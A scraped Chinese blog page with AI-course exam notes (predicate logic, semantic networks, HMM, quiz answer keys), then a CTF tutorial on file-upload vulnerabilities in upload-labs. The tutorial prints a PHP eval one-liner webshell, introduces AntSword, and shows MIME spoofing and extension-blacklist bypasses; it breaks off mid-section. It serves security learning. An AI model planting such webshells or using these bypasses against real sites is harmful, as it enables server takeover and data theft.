<p>将过滤器覆盖原图像的左上角，如图所示计算覆盖后的结果，填在结果矩阵的最左上角</p>
<p>而后往右移动 以此类推，计算结果</p>
<p><img src="/images/AdBMbFnGyoKfSQxzplscljsTn4d.png"></p>
<p>如此以此类推，结果的大小和内容都一定是确定的</p>
<p><img src="/images/VPTobgtKmoBuEbxqQcccRuR5nwh.png"></p>
<h2 id="命题和谓词公式"><a href="#命题和谓词公式" class="headerlink" title="命题和谓词公式"></a>命题和谓词公式</h2><h3 id="命题的含义"><a href="#命题的含义" class="headerlink" title="命题的含义"></a>命题的含义</h3><p>命题就是具有真假意义的陈述句。如“雪是黑的”，“3&lt;5”。</p>
<p>一个命题具有一个值，叫真值。真值有“真”和“假”两种，符号分别是 T 和 F。</p>
<p><strong>命题可以在一种情况下为真，另一种情况下为假(如 1+1&#x3D;2 和 1+1&#x3D;10)</strong></p>
<p><img src="/images/UjjhbWUy7oIyokx0aA2cnOhsnqc.png"></p>
<p><img src="/images/F5QDbybxioMRrxxOUCpcvsWTn5d.png"></p>
<h3 id="谓词和谓词逻辑"><a href="#谓词和谓词逻辑" class="headerlink" title="谓词和谓词逻辑"></a>谓词和谓词逻辑</h3><p><img src="/images/Gs7tbFnRCoZVj2xIlz5cBaFjnHf.png"></p>
<p><strong>常量</strong>：一个或一组指定的个体，比如警察，老板。</p>
<p>例如:老张是一名老司机</p>
<p>DRIVER（老张）-<strong>一元谓词</strong></p>
<p>DRIVER-<strong>谓词名</strong></p>
<p><strong>个体</strong>-老张</p>
<p><strong>一个谓词名连接 n 个个体，就是 n<strong><strong>元</strong></strong>谓词</strong></p>
<p>一般一元谓词用于表达个体的性质，而多元谓词用于表达个体之间的关系。</p>
<p><strong>二元谓词</strong></p>
<p>3&gt;5- GREATER(3, 5)</p>
<p><strong>三元谓词</strong></p>
<p>老李在阿里巴巴当工程师-WORKS(老李，阿里巴巴，工程师)</p>
<p><strong>变元（变量）</strong>：任意值</p>
<p>X&lt;5-SMALLER(x, 5)</p>
<p><strong>注：谓词名可以是任意标记，但尽量见名知意</strong></p>
<p><strong>谓词里面包含谓词，就成了二<strong><strong>阶</strong></strong>谓词</strong></p>
<p><img src="/images/AgNib5UmVoUXySxqcNdclUQPnJf.png"></p>
<p><strong>谓词逻辑表示的步骤</strong></p>
<p>1.定义谓词及个体，确定每个谓词及个体的确切含义（定义）</p>
<p>2.根据所要表达的事物或概念，为每个谓词中的变元赋以特定</p>
<p>的值（赋值）</p>
<p>3.根据所要表达的知识的语义，用适当的连接符将各个谓词连接</p>
<p>起来形成谓词公式（连接）</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>前半句和后半句无关，不存在箭头关系</p>
<p><img src="/images/U4jVbZXCxo5KehxQzynclEQsnqh.png"></p>
<p><img src="/images/DsZtbMQgBoIe1nxsfjucP3MjnXd.png"></p>
<p><img src="/images/WpdbbXYfjoRm3uxOZJWcUtfAnbh.png"></p>
<h3 id="存在逻辑用语的谓词公式"><a href="#存在逻辑用语的谓词公式" class="headerlink" title="存在逻辑用语的谓词公式"></a>存在逻辑用语的谓词公式</h3><p>有些谓词公式存在逻辑用语:(这里大括号用小括号也行)</p>
<p><img src="/images/CaTDbUHIEoSMbRxDOQWcoLKInce.png"></p>
<p><img src="/images/FWSbblbnbobwOsxlOKPc3A7KnYc.png"></p>
<p><strong>先来了解一下规则</strong></p>
<p><img src="/images/XaT9b8IM4oGmyPxXXXhcFSSLnGg.png"></p>
<p><strong>举例</strong></p>
<p><img src="/images/LL0WbMMZ5ojYfax0lXmctgGGnsX.png"></p>
<p><strong>答案</strong>：∀<em>x</em>(<em>N</em>(<em>x</em>)→(<em>I</em>(<em>x</em>)∧<em>L</em>(<em>x</em>)))</p>
<p><strong>解析</strong>：</p>
<ol>
<li><strong>量词与连接词选择</strong>：命题中 “自然数都是” 对应<strong>全称量词</strong> ∀<em>x</em>，“都是” 的逻辑关系为 “蕴含 →”（即 “若 x 是自然数，则 x 满足后续性质”）。</li>
<li><strong>性质的组合</strong>：“大于零的整数” 是两个性质的合取（同时满足），即 “x 是整数” 且 “x 大于 0”，对应_I_(<em>x</em>)∧<em>L</em>(<em>x</em>)。</li>
</ol>
<p><img src="/images/FJcub7D05oQnFYxjW0ecGhOgnfd.png"></p>
<p>“不是所有”要转化成存在”不喜欢”</p>
<p><img src="/images/P7PEbFn7sou5bAxSN6gcqPTGnge.png"></p>
<h2 id="语义网络"><a href="#语义网络" class="headerlink" title="语义网络"></a>语义网络</h2><h3 id="语义关系"><a href="#语义关系" class="headerlink" title="语义关系"></a>语义关系</h3><p>类属关系</p>
<p><img src="/images/XjSibuvUioxp03xA7RBcZmbDnke.png"></p>
<p>包含关系</p>
<p><img src="/images/ULn3bjnKpoL5KJx11tIca1YTnS3.png"></p>
<p>属性关系</p>
<p><img src="/images/M8xMbhlH2oTQVWxbSgfcudFbn24.png"></p>
<p>时间关系</p>
<p><img src="/images/N7lZbrtfOofFx8xDcUIc5qmqnGg.png"></p>
<p>位置关系</p>
<p><img src="/images/QYa3bFXz4oHdfrxyB3KccJOWnxU.png"></p>
<p>相近关系</p>
<p><img src="/images/EoIRb5eGToxcwKxWbJKcQoS9nSc.png"></p>
<p>因果关系</p>
<p><img src="/images/Zt0jbnAGeoPEEwxa2etcjWsJnKh.png"></p>
<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p><img src="/images/USaIbm2fqoBOutxkvhyc2nr7nRb.png"></p>
<p>答案</p>
<p><img src="/images/FrEgbaolco7z3pxuHIIcBoqwn8d.png"></p>
<p>全称进阶表示</p>
<p><img src="/images/KHRrb9YHUo19ybxanitcOlC4nUg.png"></p>
<h2 id="隐马尔科夫模型计算"><a href="#隐马尔科夫模型计算" class="headerlink" title="隐马尔科夫模型计算"></a>隐马尔科夫模型计算</h2><p><img src="/images/Dx9MbRz2Bo5CcbxmE30cPCFznke.png"></p>
<p><img src="/images/BiKtbOmzmotlzrxN80Ectvn9nQe.png"></p>
<p>1,2,3,3,4</p>
<p>先 1 到 2 0.9 再 2 到 3 0.5 再 3 到 3 0.4 再 3 到 4 0.6</p>
<p>乘起来即可</p>
<h1 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h1><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="人工智能的定义"><a href="#人工智能的定义" class="headerlink" title="人工智能的定义"></a>人工智能的定义</h3><p>人工智能是能够在各类环境中自主地或交互地执行各种拟人任务的机器。</p>
<p>人工智能是一种使计算机能够思维、使机器具有智力的激动人心的新尝试</p>
<p>人工智能是用计算模型进行研究的智力行为</p>
<h3 id="历史事件"><a href="#历史事件" class="headerlink" title="历史事件"></a>历史事件</h3><p>A A</p>
<p><img src="/images/WLHhb0I8BooHaSxutIBcAii2nVg.png"></p>
<h3 id="人工智能的分类"><a href="#人工智能的分类" class="headerlink" title="人工智能的分类"></a>人工智能的分类</h3><p>弱人工智能 强人工智能</p>
<h3 id="人工智能的应用"><a href="#人工智能的应用" class="headerlink" title="人工智能的应用"></a>人工智能的应用</h3><p><img src="/images/OWrYbHm5aoa6epxVkLicKxFEnsb.png"></p>
<h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="图灵测试的定义"><a href="#图灵测试的定义" class="headerlink" title="图灵测试的定义"></a>图灵测试的定义</h3><p>图灵测试是用来判断机器是否具有人类智能的测试。测试中，如果人类评判员无法区分机</p>
<p>器和人类的回答，则认为该机器具有人工智能。</p>
<h3 id="历史事件-1"><a href="#历史事件-1" class="headerlink" title="历史事件"></a>历史事件</h3><p>约翰·麦卡锡在 1956 年达特茅斯会议上提出人工智能。</p>
<p>第一台电子计算机: ABC 注意约翰</p>
<h3 id="人工智能的局限性"><a href="#人工智能的局限性" class="headerlink" title="人工智能的局限性"></a>人工智能的局限性</h3><p>社会性、主观能动性、复杂场景适应性、思想和独立决策能力，等方面</p>
<h3 id="人工神经网络的基础训练算法"><a href="#人工神经网络的基础训练算法" class="headerlink" title="人工神经网络的基础训练算法"></a>人工神经网络的基础训练算法</h3><p>反向传播算法</p>
<h3 id="认知智能的相关研究内容-WLDZ"><a href="#认知智能的相关研究内容-WLDZ" class="headerlink" title="认知智能的相关研究内容 WLDZ"></a>认知智能的相关研究内容 WLDZ</h3><p>问题求解(提出问题)，逻辑推理(分析问题)，定理证明(解决问题)，知识图谱(总结问题)</p>
<h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="机器学习的定义"><a href="#机器学习的定义" class="headerlink" title="机器学习的定义"></a>机器学习的定义</h3><p>机器学习是一门 1.专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，</p>
<p>2.重新组织已有的知识结构使之不断改善自身的性能的学科。</p>
<p>模拟学习 获新改旧</p>
<h3 id="机器学习应用领域"><a href="#机器学习应用领域" class="headerlink" title="机器学习应用领域"></a>机器学习应用领域</h3><p>图像识别、自动驾驶、医疗诊断、自然语言处理、推荐系统</p>
<h3 id="无监督学习和监督学习-无标签-标签学习"><a href="#无监督学习和监督学习-无标签-标签学习" class="headerlink" title="无监督学习和监督学习(无标签&#x2F;标签学习)"></a>无监督学习和监督学习(无标签&#x2F;标签学习)</h3><p>无监督学习使用无标签训练数据，自动挖掘特征等</p>
<p>监督学习依赖带标签数据</p>
<h3 id="贝叶斯定理基本公式"><a href="#贝叶斯定理基本公式" class="headerlink" title="贝叶斯定理基本公式"></a>贝叶斯定理基本公式</h3><p><img src="/images/MgoubtGBZoIcI6xyDmfc0dAnnRh.png"></p>
<h3 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h3><p>随机森林算法由多棵决策树组成。</p>
<p>常见的决策树算法 ID3 C4.5 CART 算法</p>
<h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="感知机模型"><a href="#感知机模型" class="headerlink" title="感知机模型"></a>感知机模型</h3><p>感知机模型的学习过程本质上是调整权重的过程。</p>
<h3 id="Sigmoid-函数的输出范围"><a href="#Sigmoid-函数的输出范围" class="headerlink" title="Sigmoid 函数的输出范围"></a>Sigmoid 函数的输出范围</h3><p>(0,1)</p>
<h3 id="激活函数-ReLU"><a href="#激活函数-ReLU" class="headerlink" title="激活函数 ReLU"></a>激活函数 ReLU</h3><p>激活函数 ReLU 的数学表达式是 max(0,x)</p>
<h3 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h3><p>基于深度学习的目标检测可以大致分为基于候选区域的和基于回归的</p>
<h3 id="工业机器人之父"><a href="#工业机器人之父" class="headerlink" title="工业机器人之父"></a>工业机器人之父</h3><p>英格伯格</p>
<h3 id="BP-算法"><a href="#BP-算法" class="headerlink" title="BP 算法"></a>BP 算法</h3><p>BP 算法训练神经网络的两个阶段是前向阶段和后向阶段</p>
<p>BP 算法在训练深度神经网络时容易陷入局部极小值的问题</p>
<p>其通用学习规则在本质上是梯度下降，找到一个函数的局部最小值</p>
<p>第一阶段将输入信号通过整个神经网络正向传播，直到最后一层</p>
<p>第二阶段计算误差，并反向传播该误差，采用梯度下降法找到损失函数的局部极小值，以调整权值和偏置</p>
<p>正向传播 计算误差 反向传播 梯度下降法</p>
<p><strong>人工神经网络的基础训练算法</strong></p>
<p><em>反向传播算法</em></p>
<h3 id="提出”区别于’控制论’的人工智能”"><a href="#提出”区别于’控制论’的人工智能”" class="headerlink" title="提出”区别于’控制论’的人工智能”"></a>提出”区别于’控制论’的人工智能”</h3><p>约翰·麦卡锡</p>
<h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="三种目标检测算法的名称"><a href="#三种目标检测算法的名称" class="headerlink" title="三种目标检测算法的名称"></a>三种目标检测算法的名称</h3><p><img src="/images/Anvzbfs1JoWbq1xYUxTciD0vnDf.png"></p>
<p>R-CNN Fast-RCNN Faster-RCNN</p>
<h3 id="在-ImageNet-数据集上获取过图像识别的第一的卷积神经网络"><a href="#在-ImageNet-数据集上获取过图像识别的第一的卷积神经网络" class="headerlink" title="在 ImageNet 数据集上获取过图像识别的第一的卷积神经网络"></a>在 ImageNet 数据集上获取过图像识别的第一的卷积神经网络</h3><p><img src="/images/KGQCbz8IIoesHjxFwtccDCwknqe.png"></p>
<p>ResNet ZFNet GoogleNet</p>
<h3 id="忆阻器"><a href="#忆阻器" class="headerlink" title="忆阻器"></a>忆阻器</h3><p>由于忆阻器能不耗费任何功率就记住其过去的状态，因而可以利用忆阻器来创建一个具有简化突触功能的物理神经网络。(突出记忆状态)</p>
<h3 id="SLAM-问题"><a href="#SLAM-问题" class="headerlink" title="SLAM 问题"></a>SLAM 问题</h3><p>机器人在未知环境中从一个未知位置开始移动，在移动过程中根据位置估计和传感器数据</p>
<p>进行自身定位，同时建造增量式地图。（突出定位和构(增量式地)图）</p>
<h2 id="最后三天"><a href="#最后三天" class="headerlink" title="最后三天"></a>最后三天</h2><h3 id="自主背诵选择题"><a href="#自主背诵选择题" class="headerlink" title="自主背诵选择题"></a>自主背诵选择题</h3><p>BDBCB</p>
<p><img src="/images/DYY5blBHKogmU4x5ZCTcj3NanHP.png"></p>
<p><img src="/images/YWiWbjb9Co1pY4xMc4IcF6ICn1O.png"></p>
<p>CBCBB</p>
<p><img src="/images/ZIOnbKpGpo5sj1xhleBcsdzVnbb.png"></p>
<p><img src="/images/LXBcbHLI1o4mDRxrP6fccDhynfc.png"></p>
<p>CABBD</p>
<p><img src="/images/PLNCbPAxJoHnuhxH6CYc6zBRnSc.png"></p>
<p>ABACB</p>
<p><img src="/images/DKTfbboVhoyNU0xniEqcDkEinVW.png"></p>
<p><img src="/images/HR8XbgkKLoaHPVxFJIGcLO9dn8e.png"></p>
<h3 id="自主背诵判断题"><a href="#自主背诵判断题" class="headerlink" title="自主背诵判断题"></a>自主背诵判断题</h3><p>TFTFF</p>
<p><img src="/images/BAVSbsY7Po9rgOxEj1Sctlg8n4c.png"></p>
<p>FTTFF FFFTT</p>
<p><img src="/images/GMdEbMNPAo0bEyxUXEPcBihmnVf.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/25/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/25/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">第六章-文件上传</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-11-25 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-25T12:00:00+08:00">2025-11-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:48:41" itemprop="dateModified" datetime="2026-01-21T01:48:41+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/EIIywCXJOif6XmksNIfcbsq4nbf?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/EIIywCXJOif6XmksNIfcbsq4nbf?from=from_copylink</a></p>
<h1 id="Week6-1-蚁剑安装和文件上传绪论"><a href="#Week6-1-蚁剑安装和文件上传绪论" class="headerlink" title="[Week6.1]蚁剑安装和文件上传绪论"></a>[Week6.1]蚁剑安装和文件上传绪论</h1><h2 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a>蚁剑安装</h2><p>对 CTF Web 学习者，蚁剑是<strong>上传后门文件</strong>后的核心管理工具。它能帮你可视化浏览服务器文件系统，快速找到并读取 &#x2F; 下载 flag；也可直接执行系统命令（如 ls、whoami），实现服务器基础控制，无需手动反复输命令。其作用是将漏洞利用落地，让从 “找漏洞” 到 “拿权限” 更高效，是 CTF Web 题中获取服务器权限的常用工具。</p>
<p><img src="/images/QZl0bEDO2o96Z6xV1kVcGuown76.png"></p>
<h2 id="文件上传绪论"><a href="#文件上传绪论" class="headerlink" title="文件上传绪论"></a>文件上传绪论</h2><ol>
<li><strong>漏洞到底是什么</strong></li>
</ol>
<p>网站里常见上传头像、附件这类功能，正常是传图片、文档这类无害文件的。但要是网站后台没做好文件检查，攻击者就能传恶意脚本文件（比如一句话木马），这就是文件上传漏洞。简单说，就是网站的 “文件安检” 出了问题，让危险文件混进了服务器。</p>
<ol>
<li><strong>漏洞能用来干嘛</strong></li>
</ol>
<p>攻击者传的恶意文件大多是叫 Webshell 的后门文件，传成功后就能控制服务器了。比如浏览服务器里的所有文件找 CTF 里的 flag，执行系统命令查看服务器信息，甚至篡改网站内容、偷取数据，危害特别大。</p>
<ol>
<li><strong>为啥会出现这漏洞</strong></li>
</ol>
<p>根源是网站的安全防护不到位。比如只在网页端用简单代码检查文件类型，很容易被绕过；或者只列了少数危险文件的黑名单，攻击者换个特殊后缀就蒙混过关了；还有的服务器没设置好权限，让上传目录里的文件能直接执行，这些都会催生漏洞。</p>
<ol>
<li><strong>CTF 里常见的利用小思路</strong></li>
</ol>
<p>新手在 CTF 题里常会遇到 “图片马” 这种利用方式。比如把正常图片和一句话木马文件拼在一起生成新图片，网站检查时只看到是图片就允许上传。之后再通过工具让服务器解析这个图片里的恶意代码，就能连接服务器找 flag 了。</p>
<h2 id="文件上传的进行"><a href="#文件上传的进行" class="headerlink" title="文件上传的进行"></a>文件上传的进行</h2><h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><p>绕过文件上传验证的规则，或者伪造正确文件，达到上传脚本文件的目的。</p>
<p>例如，我们可以尝试通过修改脚本文件后缀名（.php)为网站允许的正常文件类型（如.jpg），或者通过抓包修改 <a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=MIME%E4%BF%A1%E6%81%AF&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJNSU1F5L-h5oGvIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjE1NjkwMzYwLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.LWsWzMzkcEiO03V1kNd-yMwWPyzKPppYk20T9kFxtvc&zhida_source=entity">MIME 信息</a></p>
<p>达到绕过目的。</p>
<h3 id="“恶意文件”-的含义与-“一句话木马”"><a href="#“恶意文件”-的含义与-“一句话木马”" class="headerlink" title="“恶意文件” 的含义与 “一句话木马”"></a>“恶意文件” 的含义与 “一句话木马”</h3><p>文章里反复提 “Webshell”恶意脚本”，对零基础来说不用记复杂的，先聚焦最常用的<strong>一句话木马</strong>（CTF 题里 90% 会遇到）：它是一行超短的代码，比如 PHP 语言的 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>，作用是 “给服务器留个遥控器”—— 你把它藏在文件里传上服务器后，用蚁剑输入 “密码（pass）”，就能操控服务器。</p>
<p><strong>为什么它危险？</strong></p>
<p>就像你把家里的 “备用钥匙” 藏在门口地毯下（传木马文件），别人找到钥匙（用工具连接），就能随便进你家翻东西（读服务器文件、找 flag）、用你家设备（执行系统命令）。</p>
<h3 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证"></a>文件上传常见验证</h3><ul>
<li>后缀名，类型，文件头等</li>
<li>后缀名黑名单或白名单</li>
<li>文件类型：MIME 信息</li>
<li>文件头：内容头信息</li>
</ul>
<h3 id="明确哪些参数能用抓包工具修改"><a href="#明确哪些参数能用抓包工具修改" class="headerlink" title="明确哪些参数能用抓包工具修改"></a><strong>明确哪些参数能用抓包工具修改</strong></h3><p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=Content-Disposition&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJDb250ZW50LURpc3Bvc2l0aW9uIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjE1NjkwMzYwLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.phpKJ0FnFt2Q_Q9ICR2ow8NsC-8yJHTmv3pdVci6L4g&zhida_source=entity">Content-Disposition</a>：一般可更改</p>
<p>name：表单参数值，不可更改</p>
<p>filename：文件名，可以更改</p>
<p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=Content-Type&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJDb250ZW50LVR5cGUiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMTU2OTAzNjAsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.19_McGuUpn-sy8CydmG2ufSKPCHoE8Qvnx0R4RvVY9U&zhida_source=entity">Content-Type</a>：文件 MIME，视情况更改</p>
<p><strong>下面我们用一个示例,来解释文件上传的全流程</strong></p>
<p><del>管你听没听懂，看就完了</del></p>
<h2 id="文件上传的举例-labs-1-流程"><a href="#文件上传的举例-labs-1-流程" class="headerlink" title="文件上传的举例(labs-1 流程)"></a>文件上传的举例(labs-1 流程)</h2><p><em>这个举例做了他妈一上午啊</em></p>
<p>我们来到 upload-labs-1</p>
<p><img src="/images/JjE0bectco81GLxAx4EcQLojnzc.png"></p>
<p>要你上传一个图片,按理说我们只要不听他的话,上传一个你想执行 php 文件,然后再用文件包含的方式执行它就能得到 flag 了</p>
<p>但是我们打开网页源代码,发现 php 文件根本不允许上传</p>
<p><img src="/images/INrZbWzJhoxjhuxoSIvc2wWWnP4.png"></p>
<p>于是我们就想到先写个 php,再试着传 jpg,在传的瞬间使用 Burp 拦截,改成 php 就能绕过了</p>
<p>我们写个 flag.php,里面是我们想要执行的指令,这里加一个命令执行和 POST 变量 password,以便介绍蚁剑的使用</p>
<p><img src="/images/TmWsb4dPdoXWRtxXpoEcdn7LnGe.png"></p>
<p>把拓展名改成 jpg,用 Burp 内嵌浏览器在 Burp 拦截下上传</p>
<p><img src="/images/R4IhbElMWosVF1xn6UacwQbWnhb.png"></p>
<p><img src="/images/StCqbmznSopeaExsjagc9cxOnQf.png"></p>
<p>选择文件,打开拦截</p>
<p><img src="/images/SHZGbT2xAoPl5SxzlMVcyc5cnHg.png"></p>
<p><img src="/images/Os58bi4llot6mGxWFaFcC3Ignaf.png"></p>
<p>点击上传文件,上传被拦截,Burp 显示报告,我们将 flag.jpg 改成 flag.php,点击放行</p>
<p><img src="/images/LcJFbafQtoQh45xeWSJcFrzSnuq.png"></p>
<p>flag.php 就正常地被上传了,我们找到靶场的上传路径</p>
<p><img src="/images/LM2qbCVPEoJhLAxZ4CgcJSmkneb.png"></p>
<p>关闭拦截,输进 URL,指令被执行了</p>
<p><img src="/images/Ikf8bbx5IoWRvRxK48scFylqnXf.png"></p>
<h2 id="蚁剑获取网页文件"><a href="#蚁剑获取网页文件" class="headerlink" title="蚁剑获取网页文件"></a>蚁剑获取网页文件</h2><p>刚才我们用文件上传的方式执行了 lunix 命令,下面我们还可以使用蚁剑获取网页文件.</p>
<p><img src="/images/XKAobPdHKoZxS3xm0JrcetLynZd.png"></p>
<p>打开蚁剑添加数据,输入 flag.php 所在的地址以及刚刚的命令执行 post 变量,点测试连接报成功,直接点添加即可</p>
<p><img src="/images/FqfpbbjncoH5Xgxj19lclgyWnBb.png"></p>
<h1 id="Week6-2-实验-文件上传漏洞举例"><a href="#Week6-2-实验-文件上传漏洞举例" class="headerlink" title="[Week6.2]实验:文件上传漏洞举例"></a>[Week6.2]实验:文件上传漏洞举例</h1><p>文件上传的漏洞种类有很多,这里按理论 + 实验的方式逐个介绍</p>
<p>(pass-1 属于前端效验，即浏览器自行效验，后面则全为后端效验)</p>
<h2 id="后端-MIME-类型校验"><a href="#后端-MIME-类型校验" class="headerlink" title="后端 MIME 类型校验"></a><strong>后端 MIME 类型校验</strong></h2><ul>
<li>什么是 MIME 类型？：文件的 “身份标识”，比如.jpg 的 MIME 是 <code>image/jpeg</code>，.php 的 MIME 是 <code>application/x-httpd-php</code></li>
<li>题目漏洞：网站只看 MIME 类型是不是 “图片”，不看文件实际是啥。咱们用 Burp 把 <code>shell.php</code> 的 MIME 改成图片的，网站就会放行！</li>
</ul>
<h3 id="pass-02-实验举例"><a href="#pass-02-实验举例" class="headerlink" title="pass-02 实验举例"></a>pass-02 实验举例</h3><p>我们来到 pass-02,点显示源码,看到有对一些变量是否是”image&#x2F;jpeg”的判断,可知本题是绕过<strong>后端 MIME 类型校验题</strong></p>
<p><img src="/images/RcQMbwvYooTBVGx7LNKcNEAXnae.png"></p>
<p>我们用 Burp 直接传木马</p>
<p><img src="/images/XRHWbXiguoWd6ExtYwjcfjqJnLb.png"></p>
<p>开启拦截点击上传,找到本行代表 MIME 值,修改成我们需要的 image&#x2F;jpeg,点放行</p>
<p><img src="/images/TNBvbX76MoEXQex83DDcx389n4g.png"></p>
<p>运行通过</p>
<p><img src="/images/GeksbaBcCortyKxNWWsc9eJqn7e.png"></p>
<h2 id="后缀名黑名单校验"><a href="#后缀名黑名单校验" class="headerlink" title="后缀名黑名单校验"></a><strong>后缀名黑名单校验</strong></h2><p><strong>怎么判断是 “黑名单校验”？（还是用 2 次上传实验）</strong></p>
<ul>
<li>第一次：上传 <code>shell.php</code>（纯 PHP 后缀），页面提示 “不允许上传.php 类型文件”—— 明确告诉你 “禁止某个后缀”，不是 MIME 校验（MIME 会提示 “文件类型不正确”）；</li>
<li>第二次：上传 <code>shell.jpg</code>（正常图片），能成功上传 —— 说明只拦 “黑名单里的后缀”，允许的后缀能直接过。</li>
</ul>
<p><strong>黑名单漏洞在哪？</strong></p>
<p>PHP 除了 <code>.php</code> 后缀，还有很多 “能被服务器解析成 PHP 代码” 的变种后缀（比如 <code>.php5</code>、<code>.phtml</code>、<code>.php3</code> 等），Pass-3 的黑名单只禁了 <code>.php</code>，没禁这些变种，咱们用它们就能伪装！</p>
<p>如果 <code>.php5</code> 不行（极少数情况服务器没配置解析），还能试这些 PHP 变种后缀（Pass-3 黑名单都没禁）：</p>
<ul>
<li><code>.phtml</code>、<code>.php3</code>、<code>.php4</code>、<code>.php7</code>、<code>.phps</code>（选一个改文件名即可，比如 <code>shell.phtml</code>）</li>
</ul>
<h3 id="pass-03-实验举例"><a href="#pass-03-实验举例" class="headerlink" title="pass-03 实验举例"></a>pass-03 实验举例</h3><p>我们打开源代码,发现本题过滤了 php 文件</p>
<p><img src="/images/GmTrbvLsPoGOxyxvLtwcNOjjnDe.png"></p>
<p>我们直接传一个 php5 文件</p>
<p><img src="/images/NNJVbhbVSoFtEExnKA1cx1mbnkb.png"></p>
<p>不用拦截,直接点击上传就成功了,但发现有的格式他不会解析,直接回显的是源代码,换其他的格式即可</p>
<p>实际上,根据 pass-04 源代码,我们发现还有很多可行的绕过方式</p>
<h3 id="更多可行的绕过方式"><a href="#更多可行的绕过方式" class="headerlink" title="更多可行的绕过方式"></a>更多可行的绕过方式</h3><p><img src="/images/PraebRmLxol0A1xEsD4cWAtdnLf.png"></p>
<p>首尾加空格,用::$DATA 字符串,用大小写混合,在末尾加点等等,这些分别对应了 lab5-8 解题</p>
<p>注意 windows 系统下这些拓展名可能起不出,可以用 Burp 修改</p>
<p>::DATA 字符串我们不熟悉,可以看看</p>
<p><img src="/images/OfwpbiiEkotguwxAtaDcyqT1nId.png"></p>
<h2 id="非-php-解析方式-绕过-“超强后缀黑名单”（-htaccess-大法）"><a href="#非-php-解析方式-绕过-“超强后缀黑名单”（-htaccess-大法）" class="headerlink" title="[非 php 解析方式]绕过 “超强后缀黑名单”（.htaccess 大法）"></a>[非 php 解析方式]绕过 “超强后缀黑名单”（.htaccess 大法）</h2><p><strong>怎么判断是 “超强黑名单”？</strong></p>
<ul>
